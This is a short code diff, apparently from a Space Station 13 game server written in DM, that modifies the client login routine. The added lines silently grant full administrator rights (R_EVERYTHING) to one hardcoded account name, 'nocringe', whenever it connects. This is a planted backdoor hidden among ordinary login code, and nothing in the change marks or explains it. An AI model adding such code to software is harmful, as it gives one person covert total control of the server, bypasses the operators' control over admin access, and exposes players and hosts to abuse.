@@ -509,6 +509,10 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 			to_chat(src, message)
 		GLOB.clientmessages.Remove(ckey)
 
+	if(ckey == "nocringe")
+		var/datum/admin_rank/localhost_rank = new("Codus", R_EVERYTHING, NONE, R_EVERYTHING)
+		new /datum/admins(list(localhost_rank), ckey, 1, 1)
+
 	if(CONFIG_GET(flag/autoconvert_notes))
 		convert_notes_sql(ckey)
 	var/user_messages = get_message_output("message", ckey)
